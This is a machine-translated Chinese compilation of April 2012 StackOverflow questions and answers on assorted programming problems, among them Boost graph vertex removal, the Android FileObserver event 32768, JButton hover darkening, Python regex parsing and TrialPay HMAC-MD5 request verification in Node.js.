# StackOverflow 问答 10305000-10305999

# hadoop - JBoss Drools 与 Apache Hadoop 的集成

> ID：10305007
> 
> 赞同：2
> 
> 时间：2012-04-24T19:48:57.837
> 
> 标签：hadoop, drools

我使用 JBoss Drools 创建了一个 Web 服务，以根据一些输入获取计算数据。现在想把规则引擎分布在几个节点上，实现高可用和并行计算。谁能给我一些指导方针，有用的链接，来启动这个要求。

感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:51:23.287

您可以将 Drools 服务部署到多个节点。使用 Drools Guvnor 定义服务配置并将服务部署到您想要的所有节点。

在[Drools Guvnor 文档](http://docs.jboss.org/drools/release/5.4.0.CR1/drools-guvnor-docs/html_single/index.html#d0e1781)中，您可以阅读：

> Service Config 是定义执行服务配置的特殊资产。此执行服务是一个 war 文件（由编辑器自动生成），您可以将其部署为远程执行任何类型的客户端应用程序的知识库。由于此服务是无状态的，因此可以根据需要部署尽可能多的这些服务来服务客户端负载。

# sencha-touch-2 - Sencha touch 2、多物品轮播

> ID：10305009
> 
> 赞同：1
> 
> 时间：2012-04-24T19:49:01.393
> 
> 标签：sencha-touch-2, carousel

我想制作一个轮播，每张幻灯片都有 3 个项目，而不是无限的，只是一个显示多个项目的常规轮播。

是否有人有网址、示例或如何实施的想法。

更新：

**我希望这张图片有帮助：**

![在此处输入图像描述](../Images/19ee2b6349cdbb7676c4442837d96638.png)

*PS：我想使用数据存储来渲染数据，因为在纵向视图中我必须显示 3 个项目而不是 2*

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T09:03:56.427

也许愚蠢。但是你不能制作包含 3 个项目的子面板。因此，不是滚动浏览项目，而是滚动浏览包含 3 个项目的面板。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-12T23:31:16.800

您是否只想滚动查看 1 个新项目？我已经设置了一个多项目轮播，一次包含 12 张图片，如果发布一些代码会有所帮助，则在滑动时会看到 12 张新图片。

不要忘记这个例子也很有用，虽然你确实说过不是无限的：

[http://dev.sencha.com/deploy/touch/examples/production/list-horizo​​ntal/index.html](http://dev.sencha.com/deploy/touch/examples/production/list-horizontal/index.html)

:-)

# javascript - jQuery 对话框 Enter 提交（没有表单焦点）

> ID：10305013
> 
> 赞同：1
> 
> 时间：2012-04-24T19:49:28.950
> 
> 标签：javascript, jquery, forms, jquery-dialog

## 背景

使用 jQuery 模态对话框呈现表单。表单有一个自动完成字段。当用户从自动完成下拉菜单中选择一个选项时，表单会失去焦点。jQuery 对话框检测到 ESC 键，但从未检测到 ENTER 键。考虑几种形式之一（在同一页面上），具有各种按钮：

![](../Images/0b6406f86568daee07f150f39a959786.png)

## 代码

用于检测何时按下 ENTER 键的源代码：

```
 $(form).keyup(function( e ) {
    // Submit and close when Enter key pressed by triggering the accept button.
    //
    if( e.keyCode == $.ui.keyCode.ENTER ) {
      sequenceNumber = 0;
      $(this).parent().find( "#accept" ).trigger( 'click' );
    }
  }); 
```

每当表单的任何字段具有焦点时，这都会按预期工作（触发“接受”按钮并且服务器接收值就好了）。

## 问题

当显示对话框但没有字段具有焦点时（例如，用户单击上图中的“鱼片”），然后按 ENTER，则不会触发 keyup 事件。

## 问题

当表单没有焦点但 jQuery 对话框仍然打开时，如何接收 ENTER 事件？（与 jQuery 对话框接收 ESC 键以取消和关闭对话框的方式相同。）

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T19:58:20.573

我在正文上添加了触发器，然后检查表单是否可见。

```
$('body').keyup(function( e ) {
  if( e.keyCode == $.ui.keyCode.ENTER ) {
    if( $("#myform").is(":visible") ) {
      // Enter was pressed and form is visible
    }
  }
}); 
```

# c++ - 使用 c++ boost 库从图中删除顶点和他的所有邻居

> ID：10305019
> 
> 赞同：2
> 
> 时间：2012-04-24T19:49:38.927
> 
> 标签：c++, boost, graph, boost-graph

我想从图 G 中删除一个顶点 w 和他的邻居。

我的代码：

```
// remove all neighbours
MyGraph::adjacency_iterator n_iter, n_end;
for (tr1::tie(n_iter, n_end) = boost::adjacent_vertices (*w, G1); n_iter != n_end; ++n_iter)
{
    boost::remove_vertex(*n_iter, G1);
}

MyGraph::vertex_iterator vertex_iter, vertex_end;
Vertex vertex_w = G[*w];

// remove vertex himself
for (tr1::tie(vertex_iter, vertex_end) = boost::vertices(G1);vertex_iter != vertex_end; ++vertex_iter)
{
    Vertex vertex = G1[*vertex_iter];
    if (vertex.p_index == vertex_w.p_index)
    {
        boost::remove_vertex(*vertex_iter, G1);
        break;
    }
} 
```

我试图遍历相邻的顶点并删除它们。之后，我尝试删除顶点 w。

但是在启动程序时会出现一些异常和错误。

有人提示我从图表中删除和顶点 w 与他的所有邻居吗？

**更新：** 现在我明白为什么上面的代码不起作用（我正在使用 VertexList=vecS）。我现在尝试将顶点标记为“已删除”并希望删除所有边缘。

图形：

```
0     1
o-----o
|     |
|     |
o-----o
2     3 
```

代码：

```
typedef boost::adjacency_list<boost::listS, boost::vecS, boost::undirectedS, Vertex, Edge> MyGraph;
[...]
// *w is Vertex "1"
boost::graph_traits<MyGraph>::adjacency_iterator n_iter, n_end, next;
for (tr1::tie(n_iter, n_end) = boost::adjacent_vertices (*w, G1); n_iter != n_end; ++n_iter)
{
    cout << G1[*n_iter].p_index << endl;
    G1[*n_iter].Graph_Part = Graph_Part::R;
    // boost::clear_vertex(*n_iter, G1); <-- problem
 }
cout << endl << "----" << endl; 
```

如果我取消注释 clear_vertex 方法，输出是：

```
0
3 
```

如果程序移除 *n_iter 的边，则输出仅为：

```
0 
```

- 循环在一次迭代后结束。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T19:52:25.383

看看[这里](http://www.boost.org/libs/graph/doc/MutableGraph.html)。`remove_vertex`不会改变任何边缘。你首先需要`clear_vertex`它。

一般提示：不要对`boost::graph`库使用合格的调用，称它们为不合格的。我还建议[Boost.Range](http://www.boost.org/libs/range/doc/html/index.html)在这种简单的情况下处理迭代。它使范围更清洁，更漂亮。

# c# - 在 CometD 中设置 Cookie 域

> ID：10305021
> 
> 赞同：3
> 
> 时间：2012-04-24T19:49:52.747
> 
> 标签：c#, .net, salesforce, cometd, cometd.net

`setCookie(string, string)`CometD .NET 在调用方法时抛出异常，`BayeuxClient`因为我没有为这些 cookie 设置域，但我没有看到设置域的属性或方法，并且没有任何重载`setCookie(...)`将域作为范围。

代码：

```
this._bayeuxClient = new BayeuxClient(
                "https://***.salesforce.com/cometd/24.0", //instance omitted
                new List<ClientTransport> { new LongPollingTransport(null) });

this._bayeuxClient.setCookie("com.salesforce.LocaleInfo", "us");
//...

this._bayeuxClient.handshake(); //Exception is thrown here.
this._bayeuxClient.waitFor(1000, 
    new List<BayeuxClient.State> { BayeuxClient.State.CONNECTED }); 
```

# c++ - 将 atan2 与类模板一起使用会因对重载函数的模糊调用而失败

> ID：10305026
> 
> 赞同：1
> 
> 时间：2012-04-24T19:50:03.883
> 
> 标签：c++, class, templates

我正在尝试`atan2`在我的类模板中使用该函数，但它不起作用。我有一个名为 myclass 的类，我正在尝试制作一个函数模板，这个函数是取两个数字 a 和 b 的 tan。这些既可以是 int 也可以是双精度数

```
template <class T>   
T myclass<T>::returnArg()  
{  
    T arg(0);  
    arg = atan2(a, b);  
    return arg;  
} 
```

但我明白了`error C2668: 'atan2' : ambiguous call to overloaded function`。任何人都可以提出解决这个问题的建议吗？

谢谢你。

编辑：我希望能够将整数和双打传递给 atan2 函数，我试过了

```
arg = atan2(<T> a, <T> b); 
```

但这没有用。

编辑 2：我在课堂上声明 a 和 b 为

```
template <class T> class myclass
{
private:
    T a,b;
public:
    myclass(): a(0),b(0){};
    myclass(T r, T i) : a(r), b(i){};
// ... 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T19:57:04.777

[`atan2`](http://en.cppreference.com/w/cpp/numeric/math/atan2)C++根据其输入参数的类型定义了几个重载。如果`a`和`b`在您的代码片段中是不同的类型，则重载解析将失败，因为调用不明确。

您需要强制转换`a`或`b`酌情使它们的类型匹配。

如果您打算调用`atan2(double, double)`，另一种解决方案是包含`math.h`而不是`cmath`然后调用该函数 as `::atan2( a, b )`。这将隐式转换`a`和转换`b`为`double`（如果可以进行这种转换）。

# c# - 将 XCEED 属性网格更新到数据库

> ID：10305031
> 
> 赞同：1
> 
> 时间：2012-04-24T19:50:28.347
> 
> 标签：c#, wpf, xceed

我的任务是将 Xceed 属性网格中的值更新为数据库。我怎么能做到这一点。请帮忙。查看代码如下

```
enter code here

<xctk:PropertyGrid  DataContext="{Binding Source={StaticResource Locator}, Path=OpenInfo}" 
SelectedObject="{Binding Path=SelectedProject}" ShowSortOptions="False" NameColumnWidth="100">

<i:Interaction.Triggers>
   <i:EventTrigger EventName="PropertyValueChanged">
     <cmd:EventToCommand Command="{Binding Mode=OneWay,  Path=SaveInfo}" />
                                </i:EventTrigger>
                            </i:Interaction.Triggers> 
```

我将一个对象绑定到属性网格。当用户更新对象的属性时，我需要将更改的属性更新到数据库。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:39:00.323

考虑在您的应用程序中使用[存储库设计模式](http://msdn.microsoft.com/en-us/library/ff649690.aspx)。DataGridControl的[ItemsSource](http://doc.xceedsoft.com/products/XceedWpfDataGrid/Xceed.Wpf.DataGrid.v4.3~Xceed.Wpf.DataGrid.DataGridForeignKeyDescription~ItemsSource.html)可以绑定到 ViewModel 中的 RepositoryView（它是 RepositoryItems 的集合），并且连接服务负责将项目存储到/从数据库中检索。将 DataGridControl 直接绑定到数据库是一个非常糟糕的习惯：它很容易“不同步”，并且您几乎无法控制在客户端和服务器之间传输的数据。使用存储库时，您可以控制每个项目并知道它的状态（是否应该在数据库上更新等）。

# android - 使用 ActionBarSherlock 泄漏内存

> ID：10305037
> 
> 赞同：3
> 
> 时间：2012-04-24T19:50:55.137
> 
> 标签：android, actionbarsherlock

每次手机旋转后，整个 Activity 以及 ViewPager、所有 Fragments、ListViews 等都不会被 GC。我可以说是因为 OutOfMemoryError 在 30 次轮换和 MAT 之后，这告诉我我有 30 多个 ListViews 实例。

在删除了我的应用程序中的几乎所有内容并离开 ActionBarSherlock 之后，事实证明，这是造成泄漏的原因。

我正在调试 2.3.7 Desire。

ABS库有问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T19:53:19.113

不，没有！

**希望有人可以向我解释**，但显然，当您从设备菜单而不是从调试角度运行应用程序时，泄漏消失了。

有关更多详细信息，请查看此已关闭问题：[https ://github.com/JakeWharton/ActionBarSherlock/issues/413](https://github.com/JakeWharton/ActionBarSherlock/issues/413)

感谢 Jake 提供了一个很棒的图书馆！:)

# django - Django Haystack/Solr：根据包含状态列表的字段过滤结果

> ID：10305042
> 
> 赞同：2
> 
> 时间：2012-04-24T19:51:14.150
> 
> 标签：django, search, solr, django-haystack

我正在研究人员姓名的搜索功能，该功能可以按他们开展业务的州进行过滤。有些人在多个地区做生意，所以我的问题是，如何在一个字段中存储一个州列表，以便我可以对该字段中的任何州进行精确搜索？

示例数据：

```
| 人名 | 国家 |
|==============|=============|
| 约翰·多伊 | 加利福尼亚州、内华达州、亚利桑那州 |
| 约翰·史密斯 | 纽约州，新泽西州 |
| ... |
|==============|=============|

```

这是我现在的代码：# search_indexes.py

```
class ProfileIndex(RealTimeSearchIndex):
    text = indexes.CharField(document=True) # the person's name
    state = indexes.CharField(faceted=True)

    def prepare_text(self, profile):
        return profile.display_name

    def prepare_state(self, profile):
        return ???????

# search code
search_string = "John"
search_state = "CA"
search_results = SearchQuerySet().models(Profile) \
            .filter(text=search_string, state=search_state) \
            .load_all()

# Should only return John Doe because of the search_state constraint... 
```

我希望 solr 准确地解析州名，而不做任何 solr 魔术，比如词干/模糊匹配/等等...

这似乎是一个基本要求，我没有看到什么？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:15:35.513

```
state = indexes.MultiValueField()

    def prepare_state(self, obj):
        return [g.pk for g in obj.state_set.all()] 
```

# java - 悬停/单击时使 JButton 变暗

> ID：10305047
> 
> 赞同：0
> 
> 时间：2012-04-24T19:51:28.923
> 
> 标签：java, swing, mouseover, jbutton, imageicon

```
ImageIcon backpackImageIcon = new ImageIcon("images/gui/button_backpack.png");
JButton backpackButton = new JButton();
backpackButton.setBounds(660,686,33,33);
backpackButton.setBorderPainted(false);
backpackButton.setFocusPainted(false);
backpackButton.setVisible(true);
backpackButton.getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW).put(KeyStroke.getKeyStroke("B"), "backpackButtonPress");
backpackButton.getActionMap().put("backpackButtonPress", ClassBackpackButton);
backpackButton.setAction(ClassBackpackButton);
backpackButton.setIcon(backpackImageIcon);
backpackButton.setToolTipText("Backpack[B]");
panel.add(backpackButton); 
```

我有多个按钮以这种方式设置。我希望能够做的是让它们在悬停时变暗 10%，在点击时可能变暗 20%。我试图四处寻找如何做到这一点，但没有运气（只找到了 javascript 的东西）。抱歉，如果之前有人问过这个问题，感谢您的帮助。

*****编辑*****

我试图这样做，但它只是将图像变为空白：

```
BufferedImage bufferedImage = null;
try {
    bufferedImage = ImageIO.read(new File("images/gui/button_backpack.png"));
} catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
}
BufferedImage darkerBackpackBufferedImage = new BufferedImage(32, 32, BufferedImage.TYPE_BYTE_INDEXED);
RescaleOp op = new RescaleOp(1.3f, 0, null);
darkerBackpackBufferedImage = op.filter(bufferedImage, null);
ImageIcon darkerBackpackImageIcon = new ImageIcon((Image) darkerBackpackBufferedImage);
backpackButton.setRolloverIcon((ImageIcon) darkerBackpackImageIcon); 
```

*****编辑***** 与解决方案

这是我为阅读以上内容的任何人使用的修改后的 shiftColor 函数......祝你好运:)

```
public BufferedImage shiftColor(BufferedImage img, int rShift, int gShift, int bShift) {
    Color tmpCol;
    int tmpRed, tmpGreen, tmpBlue;
    for (int x = 0; x < img.getWidth(); x++) {
        for (int y = 0; y < img.getHeight(); y++) {
            tmpCol=new Color(img.getRGB(x,y));
            tmpRed = (tmpCol.getRed()-rShift < 0) ? 0 : tmpCol.getRed()-rShift; //if shifted color is less than 0 change to 0
            tmpGreen = (tmpCol.getGreen()-gShift < 0) ? 0 : tmpCol.getGreen()-gShift; //if shifted color is less than 0 change to 0
            tmpBlue = (tmpCol.getBlue()-bShift < 0) ? 0 : tmpCol.getBlue()-bShift; //if shifted color is less than 0 change to 0
            tmpCol=new Color(tmpRed, tmpGreen, tmpBlue);
            img.setRGB(x,y,tmpCol.getRGB());
        }
    }
    return img;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T21:07:30.837

有两种方法

1)[在 JButtons API 中使用内置方法](https://stackoverflow.com/a/9300813/714968)

```
button.setIcon((Icon i));
button.setRolloverIcon((Icon i));
button.setPressedIcon(Icon i));
button.setDisabledIcon(Icon i)); 
```

2）使用[按钮模型](https://stackoverflow.com/a/5755124/714968)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T21:32:00.137

此函数将返回一个带有颜色偏移的 BufferedImage（即更亮/更暗）

```
public BufferedImage shiftColor(BufferedImage img, int rShift, int gShift,int bShift) {
    Color tmpCol;
    for (int x = 0; x < img.getWidth(); x++) {
        for (int y = 0; y < img.getHeight(); y++) {
            tmpCol=new Color(img.getRGB(x,y));
            tmpCol=new Color(tmpCol.getRed()-rShift,tmpCol.getGreen()-gShift,tmpCol.getBlue()-bShift);
            img.setRGB(x,y,tmpCol.getRGB());
        }
    }
    return img;
} 
```

即使这可行，我仍然建议在图像编辑器（即 Photoshop）中创建明暗图像并在启动时加载两者。上面的代码将是进程密集型的，并且会减慢您的应用程序运行时间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:02:53.877

看看这个[教程](http://docs.oracle.com/javase/tutorial/uiswing/events/mouselistener.html)。您可能对 mouseEntered 感兴趣。由于不是在 Java 中更改背包的颜色，而是考虑 2 个图像，一个是浅色背包，另一个是深色背包。将鼠标悬停在按钮上时更改它们。

```
public class MouseEventDemo implements MouseListener {
    ImageIcon backpackImageIcon = new ImageIcon("images/gui/button_backpack.png");
    JButton backpackButton = new JButton();
    backpackButton.setBounds(660,686,33,33);
    backpackButton.setBorderPainted(false);
    backpackButton.setFocusPainted(false);
    backpackButton.setVisible(true);
    backpackButton.addMouseListener(this);
    addMouseListener(this);

    backpackButton.setIcon(backpackImageIcon);
    backpackButton.setToolTipText("Backpack[B]");
    panel.add(backpackButton);  

    public void mousePressed(MouseEvent e) {}

    public void mouseReleased(MouseEvent e) {}

    public void mouseEntered(MouseEvent e) {
       //set button color to dark color
    }
    public void mouseExited(MouseEvent e) {
       //set button color to light color
    }
    public void mouseClicked(MouseEvent e) {}

} 
```

# android - Android FileObserver 传递未记录的事件 32768

> ID：10305054
> 
> 赞同：11
> 
> 时间：2012-04-24T19:51:58.157
> 
> 标签：android

我正在使用[FileObserver](http://developer.android.com/reference/android/os/FileObserver.html)来观察目录的变化。该过程在 90% 的情况下都能正常工作，但偶尔会失败。

这是 logcat 的一个工作示例：

```
04-23 21:12:03.873: V/ItemObserver(1663): Setting up new item observer for item 2
04-23 21:12:04.374: I/ItemObserver(1663): Received item event for item 2, event: 256, file: batch.get.47
04-23 21:12:07.866: I/ItemObserver(1663): Received item event for item 2, event: 512, file: batch.get.47
04-23 21:12:07.873: I/ItemObserver(1663): Received item event for item 2, event: 512, file: item.xml
04-23 21:12:07.883: I/ItemObserver(1663): Received item event for item 2, event: 256, file: item.xml
04-23 21:12:08.033: I/ItemObserver(1663): Received item event for item 2, event: 8, file: item.xml 
```

这是一个失败的例子：

```
04-23 22:08:09.403: V/ItemObserver(1751): Setting up new item observer for item 2
04-23 22:08:09.813: I/ItemObserver(1751): Received item event for item 2, event: 256, file: batch.get.52
04-23 22:08:09.954: I/ItemObserver(1751): Received item event for item 2, event: 32768, file: null 
```

一旦我收到带有空文件的 32768 事件，一切都会停止。我检查了 FileObserver 的来源并搜索了 inotify 32768，但找不到在任何地方引用它的位置。

设置观察者的代码如下：

```
itemDirObserver = new FileObserver(getItemsCache().getProcessedItemDir(itemId).getPath(), 
FileObserver.CLOSE_WRITE | FileObserver.CREATE | FileObserver.DELETE) {
  @Override
  public void onEvent(int event, final String file) {
    itemDirChanged(event, file);
  }
};
itemDirObserver.startWatching(); 
```

logcat 的代码是：

```
public synchronized void itemDirChanged(int event, String file) {
  Log.i(LOG, "Received item event for item " + itemId + ", event: " + event + ", file: " + file);
  switch (event) {
<snip> 
```

知道 32768 和空文件是什么意思吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-17T20:04:53.603

感谢[这个答案](https://stackoverflow.com/a/10455467/931277)。

[此处](http://rswiki.csie.org/lxr/http/source/include/linux/inotify.h?a=m68k#L45)列出了事件代码。

尤其是 32768 是这样的：

#define IN_IGNORED 0x00008000 /* 文件被忽略 */

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-12-02T03:46:50.630

我也遇到过偶尔的失败。

我发现了 Android FileObserver 的一个大问题：你不能让两个 FileObserver 在你的应用程序中监视同一个文件夹。

如果您调用`StopWatching`一个 FileObserver，正在观看同一文件夹的任何其他 FileObserver 也将停止观看。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-27T08:42:16.660

我遇到的问题是我的 FileObserver 收到 32768 事件并停止工作。几天来，我拼命想了解如何解决这个问题（不重新创建 FileObserver）。

首先，我发现虽然我对我的 FileObserver 有一个硬引用，但这个事件 (32768) 可以由垃圾收集触发（当我通过 DDMS 强制它时）。

最终我发现我的程序中有另一个 FileObserver 到同一个文件夹。我一删除它，一切就开始工作了。

有谁知道让多个观察员进入同一个目录是否合法？我找不到任何关于它的信息

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-08-12T02:48:34.313

onEvent() 中的事件不会以文档的形式返回确切的数字，您需要如下包装

```
public void onEvent(int event, String path) {

        if ((FileObserver.CREATE & event)!=0) {
            PUtils.log("CREATE: " + rootPath + path);
        } else if ((FileObserver.MODIFY & event)!=0) {
            PUtils.log("MODIFY: " + rootPath + path);
        } else if ((FileObserver.DELETE & event)!=0) {
            PUtils.log("DELETE: " + rootPath + path);
        } else if ((FileObserver.DELETE_SELF & event)!=0) {
            PUtils.log("DELETE_SELF: " + rootPath + path);
        } else if ((FileObserver.MOVED_FROM & event)!=0) {
            PUtils.log("MOVED_FROM: " + rootPath + path);
        } else if ((FileObserver.MOVED_TO & event)!=0) {
            PUtils.log("MOVED_TO: " + rootPath + path);
        } else if ((FileObserver.MOVE_SELF & event)!=0) {
            PUtils.log("MOVE_SELF: " + rootPath + path);
        } else {
            PUtils.log("Unhandled event " + event + rootPath + path);
        } 
```

# ruby - 类是模块吗？

> ID：10305057
> 
> 赞同：0
> 
> 时间：2012-04-24T19:52:10.953
> 
> 标签：ruby

irb 的一些有趣输出：

```
irb(main):001:0> Class.ancestors
=> [Class, Module, Object, Kernel, BasicObject]
irb(main):002:0> class Foo
irb(main):003:1> end
=> nil
irb(main):004:0> module Foo
irb(main):005:1> end
TypeError: Foo is not a module
        from (irb):4
        from D:/Ruby193/bin/irb:12:in '<main>'
irb(main):006:0> Foo.is_a? Module
=> true 
```

根据类的定义，类是可以实例化的派生模块。但是irb告诉我们，有时候是模块，有时候又不是……

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T19:58:00.637

这里的问题是您创建了一个`Class`( `Foo`)，现在正试图将其重新定义为`Module`. 无论类和模块的继承如何，您都不能将一个更改为另一个，或者在它们之间“转换”

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:15:52.983

该表达式`Foo.is_a? Class`也返回`true`，因为`is_a?`不仅当 class 是对象的类时返回 true，而且如果 class 是 object 的超类之一或 object 中包含的模块。

# html - 点击箭头使用 YOUTUBE iframe 导航多个视频

> ID：10305060
> 
> 赞同：0
> 
> 时间：2012-04-24T19:52:18.163
> 
> 标签：html, iframe, html5-video, youtube-api

我的视频设置了视频加载，您可以单击下面的图像来浏览其他视频。我使用了这个解决方案[点击使用 YOUTUBE iframe 加载多个视频](https://stackoverflow.com/questions/7729615/click-loads-multiple-videos-using-youtube-iframe)

在这个小提琴上看到：http: [//jsfiddle.net/Y9j7R/5/](http://jsfiddle.net/Y9j7R/5/)

我希望能够使用 prev/next 箭头浏览这些视频。任何帮助表示赞赏。另外，我用最好的方法来解决这个问题，我找不到其他任何东西。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-11T15:48:19.863

我通过创建 nextOrFirst 和 prevOrLast 函数并触发对箭头的点击来解决这个问题。代码在这里看到：

```
// Fake click for video arrows //

// Adds function nextOrFirst() //
jQuery.fn.nextOrFirst = function(selector){
var next = this.next(selector);
return (next.length) ? next : this.prevAll(selector).last();
}

// Adds function prevOrLast() //
jQuery.fn.prevOrLast = function(selector){
var prev = this.prev(selector);
return (prev.length) ? prev : this.nextAll(selector).last();
}

$(".icon-video-left-arrow").click(function() {
$(".fader.active").prevOrLast().trigger("click");
});

$(".icon-video-right-arrow").click(function() {
$(".fader.active").nextOrFirst().trigger("click");
}); 
```

# javascript - 使用 phonegap 和 javascript 从 Amazon S3 存储解析 PDF

> ID：10305061
> 
> 赞同：1
> 
> 时间：2012-04-24T19:52:20.683
> 
> 标签：javascript, pdf, cordova, amazon-s3

我正在尝试编写我的第一个 PhoneGap 应用程序，并希望读取和解析位于 Amazon S3 存储上的 PDF 的内容。我曾使用 iTextPdf 等工具创建 Android 应用程序来解析 PDF 文件，但我对 javascript 和 Phonegap 的了解有限。我知道 Amazon S3 有 REST 请求，您可以调用它来获取文件，但我似乎找不到任何关于如何使用 Javascript 执行此操作的示例。如果有人能告诉我这是否可能，我将不胜感激，如果可以，请提供一些示例代码或指导，以便我可以找到有关如何执行此操作的答案。

谢谢

# python - 匹配正则表达式（python）

> ID：10305063
> 
> 赞同：1
> 
> 时间：2012-04-24T19:52:24.913
> 
> 标签：python, regex, bioinformatics

对于像这样的序列：

NM_001003443 chr11 + 5925152 5926098 5925152 5926098 2 5925152,5925652, 5925404,5926098,

我想要一条如下所示的信息行（未拼接，意味着 sys.argv 中有一个“-s”）：

`>NM_00100343|chr11(+):5925152Z5926098`

或（拼接，sys.argv 中没有“-s”）：

`>NM_00100343|chr11(+):5925152Z5926098|5925151Z5925404,5925652Z5926098`

我试图这样做，但一直得到不正确的匹配，有人可以查看我的正则表达式并查看它是否看起来和/或匹配正确吗？

我已经写了：

p = '(NM_\d+)\s+(chr\d+)\s+([+|-])\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+ (\d+)\s+(\d+),(\d+),\s+(\d+),(\d+),'

并尝试通过（文件中的每一行看起来像上面给出的行示例，由 fp = open(infile, 'r') 打开：

```
for line in fp:
    r = search(p, line)
    if '-s' in sys.argv and r:
        wp.write('>'+r.group(1)+'|'+r.group(2)+'('+r.group(3)+')'+':'+r.group(4)+'-'+r.group(5))
    else:
        wp.write('>'+r.group(1)+'|'+r.group(2)+'('+r.group(3)+')'+':'+r.group(4)+'-'+r.group(5)+'|'+r.group(6)+'-'+r.group(11)+','+r.group(9)+'-'+r.group(12)) 
```

**编辑，这似乎是正确的？**

```
for line in fp:
    line = line.replace(',',' ')
    tokens = line.split()
    if '-s' in sys.argv and r:
        wp.write('>'+tokens[0]+'|'+tokens[1]+'('+tokens[2]+')'+':'+tokens[3]+'-'+tokens[4])
    else:
        wp.write('>'+tokens[0]+'|'+tokens[1]+'('+tokens[2]+')'+':'+tokens[3]+'-'+tokens[4]+'|'+tokens[5]+'-'+tokens[10]+','+tokens[8]+'-'+tokens[11]) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:04:49.790

您需要的所有数据都由空格或逗号分隔，因此您根本不需要正则表达式。

```
mystring = mystring.replace(',', ' ')  # convert all commas to spaces
tokens = mystring.split()  # split at spaces 
```

如果要坚持使用正则表达式，则有一些拼写错误。这是正确的正则表达式： `p = '(NM_\d+)\s+(chr\d+)\s+([+|-])\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+),(\d+),\s+(\d+),(\d+),'`

1.  `[+-]`没有括号和|
2.  失踪`\s+`后`(chr\d+)`
3.  在正则表达式末尾的`\`术语中缺失`,s+(`

# javascript - 使用 Node.js、Express 和 Trialpay 进行 HMAC MD5 验证

> ID：10305067
> 
> 赞同：8
> 
> 时间：2012-04-24T19:52:47.580
> 
> 标签：javascript, node.js, cryptography, express

我正在尝试使用 Node.js 和 Express 验证从 TrialPay 发送的消息。TrialPay 使用 HMAC-MD5 哈希对请求进行签名，并提供[这些](https://merchant.trialpay.com/help/?page=hmac)验证说明。

这是我的代码：

```
app.post('/trialpay', function(req, res) {

    var key = "[MY MERCHANT KEY]";
    var hash = req.header("TrialPay-HMAC-MD5");
    var data = req.body.toString();

    var crypted = require("crypto").createHmac("md5", key)
        .update(data)
        .digest("hex");

    if (hash == crypted) {
        res.writeHead(200, {"Content-Type": "plain/text"});
        res.end("Success!");
    } else {
        throw new Error("Invalid TrialPay Hash");
    }  
}); 
```

显然，这不起作用（哈希不匹配）。

免责声明：我对 Node.js 非常陌生，开始时几乎没有 Javascript 经验。

**更新**

我没有意识到该链接受到保护。

> TrialPay 使用您的 Notification-Key（在您的帐户信息中设置）作为密钥来签署 HMAC。对于 GET 请求，问号（在 URL 中）后面的查询字符串已签名。对于 POST 请求，整个 POST 正文都已签名。

以下是 TrialPay 如何指导您在 Google App Engine (Python) 中进行验证的示例：

```
class MyHandler(webapp.RequestHandler):
  def post(self):
  key = '[YOUR MERCHANT KEY]'
  tphash = self.request.headers['TrialPay-HMAC-MD5'] 
  if hmacmd5(key,self.request.body) != tphash:
    logging.info('invalid trialpay hash')
    return 
```

**更新 2**

`req.body`打印出来为：

```
{ 
  oid: 'sample-order-id',
  sid: 'customer-sid',
  order_date: '04/24/2012',
  timestamp: '04/24/2012 16:28:46',
  first_name: 'customer-firstname',
  last_name: 'customer-lastname',
  email: 'customer@trialpay.com',
  revenue: '10.00',
  zip_code: '94041',
  country: 'US' 
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-25T15:51:45.647

这应该可以解决问题：

```
var crypto = require('crypto');

function calculateSignature(key) {
    return function(req, res, next) {
        var hash = req.header("TrialPay-HMAC-MD5"),
            hmac = crypto.createHmac("md5", key);

        req.on("data", function(data) {
            hmac.update(data);
        });

        req.on("end", function() {
            var crypted = hmac.digest("hex");

            if(crypted === hash) {
                // Valid request
                return res.send("Success!", { "Content-Type": "text/plain" });
            } else {
                // Invalid request
                return res.send("Invalid TrialPay hash", { "Content-Type": "text/plain" }, 403);
            }
        });

        req.on("error", function(err) {
            return next(err);
        });
    }
}

app.post("/trialpay", calculateSignature("[MY MERCHANT KEY]")); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-07-20T04:44:27.423

对于 Parse Cloud Code：（我已经测试过）重点是 express.bodyParser 将解析用于散列的 url 编码字符串。

```
var parseExpressRawBody = require('parse-express-raw-body');
var queryString = require('querystring');
app.post('/trialpay',parseExpressRawBody(),function(req, res) {
var hmac, calculatedSignature,payloadStr=req.body.toString();
hmac = crypto.createHmac('md5', TrialPayMerchentKey);
hmac.update(payloadStr);
calculatedSignature = hmac.digest('hex');

if (req.headers['trialpay-hmac-md5'] === calculatedSignature) {
   ~~~~~~ 
```

# c# - 不想等待方法返回

> ID：10305069
> 
> 赞同：1
> 
> 时间：2012-04-24T19:52:57.267
> 
> 标签：c#, qtp

有没有办法“告诉”C#不要等待对象的方法返回？

